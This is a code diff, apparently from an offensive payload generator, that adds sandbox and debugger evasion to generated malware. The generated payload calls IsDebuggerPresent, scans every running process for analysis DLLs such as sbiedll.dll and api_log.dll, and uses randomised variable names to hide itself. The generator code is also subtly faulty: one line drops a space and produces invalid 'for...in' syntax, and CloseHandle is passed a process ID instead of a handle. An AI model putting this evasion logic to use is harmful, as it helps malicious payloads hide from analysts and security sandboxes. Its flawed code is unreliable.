@@ -76,6 +76,55 @@ def senecas_games(evasion_payload):
             # Add a tab for this check
             num_tabs_required += 1
 
+        if evasion_payload.required_options["DETECTDEBUG"][0].lower() != "false":
+
+            is_debugger_present = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'from ctypes import *\n'
+            check_code += '\t' * num_tabs_required + is_debugger_present + ' = windll.kernel32.IsDebuggerPresent()\n'
+            check_code += '\t' * num_tabs_required + 'if ' + is_debugger_present + ' == 0:\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["VIRTUALDLLS"][0].lower() != "false":
+
+            evidenceof_sandbox = evasion_helpers.randomString()
+            sandbox_dlls = evasion_helpers.randomString()
+            all_pids = evasion_helpers.randomString()
+            pid = evasion_helpers.randomString()
+            hProcess = evasion_helpers.randomString()
+            curProcessDLLs = evasion_helpers.randomString()
+            dll = evasion_helpers.randomString()
+            dll_name = evasion_helpers.randomString()
+            sandbox_dll = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'import win32api\n'
+            check_code += '\t' * num_tabs_required + 'import win32process\n'
+            check_code += '\t' * num_tabs_required + evidenceof_sandbox + '= []\n'
+            # removed dbghelp.dll
+            check_code += '\t' * num_tabs_required + sandbox_dlls + ' = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]\n'
+            check_code += '\t' * num_tabs_required + all_pids + '= win32process.EnumProcesses()\n'
+            check_code += '\t' * num_tabs_required + 'for ' + pid + ' in ' + all_pids + ':\n'
+            check_code += '\t' * num_tabs_required + '\ttry:\n'
+            check_code += '\t' * num_tabs_required + '\t\t' + hProcess + ' = win32api.OpenProcess(0x0410, 0, ' + pid + ')\n'
+            check_code += '\t' * num_tabs_required + '\t\ttry:\n'
+            check_code += '\t' * num_tabs_required + '\t\t\t' + curProcessDLLs + '= win32process.EnumProcessModules(' + hProcess + ')\n'
+            check_code += '\t' * num_tabs_required + '\t\t\tfor ' + dll + 'in ' + curProcessDLLs + ':\n'
+            check_code += '\t' * num_tabs_required + '\t\t\t\t' + dll_name + '= str(win32process.GetModuleFileNameEx(' + hProcess + ', ' + dll + ')).lower()\n'
+            check_code += '\t' * num_tabs_required + '\t\t\t\tfor ' + sandbox_dll + ' in '+ sandbox_dlls + ':\n'
+            check_code += '\t' * num_tabs_required + '\t\t\t\t\tif ' + sandbox_dll + ' in ' + dll_name + ':\n'
+            check_code += '\t' * num_tabs_required + '\t\t\t\t\t\tif ' + dll_name + ' not in ' + evidenceof_sandbox + ':\n'
+            check_code += '\t' * num_tabs_required + '\t\t\t\t\t\t\t' + evidenceof_sandbox + '.append(' + dll_name + ')\n'
+            check_code += '\t' * num_tabs_required + '\t\tfinally:\n'
+            check_code += '\t' * num_tabs_required + '\t\t\twin32api.CloseHandle(' + pid + ')\n'
+            check_code += '\t' * num_tabs_required + '\texcept:\n'
+            check_code += '\t' * num_tabs_required + '\t\tpass\n'
+            check_code += '\t' * num_tabs_required + 'if not ' + evidenceof_sandbox + ':\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
         if evasion_payload.required_options["MINRAM"][0].lower() != "false":
 
             class_name = evasion_helpers.randomString()
@@ -125,9 +174,9 @@ def senecas_games(evasion_payload):
 
             # Add a tab for this check
             num_tabs_required += 1
-        
+
         if evasion_payload.required_options["VIRTUALFILES"][0].lower() != "false":
-            
+
             vmfiles_exist = evasion_helpers.randomString()
             files_tocheck = evasion_helpers.randomString()
             file_path = evasion_helpers.randomString()
